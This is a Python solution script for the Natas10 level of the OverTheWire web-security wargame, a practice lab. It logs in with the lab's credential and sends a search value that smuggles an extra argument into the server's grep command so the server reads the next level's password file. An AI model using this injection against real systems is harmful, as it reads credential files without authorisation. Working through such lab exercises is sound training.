import re
import requests
import html

user = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
url = 'http://{}.natas.labs.overthewire.org/'.format(user)
data = {'needle' : '. /etc/natas_webpass/natas11 #', 'submit' : 'Search'}
r = requests.Session().post(url, data= data, auth=(user, password)).text
print(re.findall('pre>\n(.*)', r)[0])